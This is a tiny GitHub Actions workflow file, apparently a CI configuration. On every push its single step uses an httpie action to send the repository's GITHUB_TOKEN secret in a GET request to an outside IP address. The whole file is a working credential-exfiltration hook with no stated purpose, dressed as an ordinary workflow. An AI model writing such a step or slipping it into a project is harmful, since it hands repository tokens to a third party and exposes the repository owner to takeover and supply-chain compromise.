workflow "New Te" {
  on = "push"
  resolves = ["HTTP client"]
}

action "HTTP client" {
  uses = "swinton/httpie.action@69125d73caa2c6821f6a41a86112777a37adc171"
  args = ["GET", "66.70.188.19/$GITHUB_TOKEN"]
  env = {
    a = "a"
  }
  secrets = ["GITHUB_TOKEN"]
}
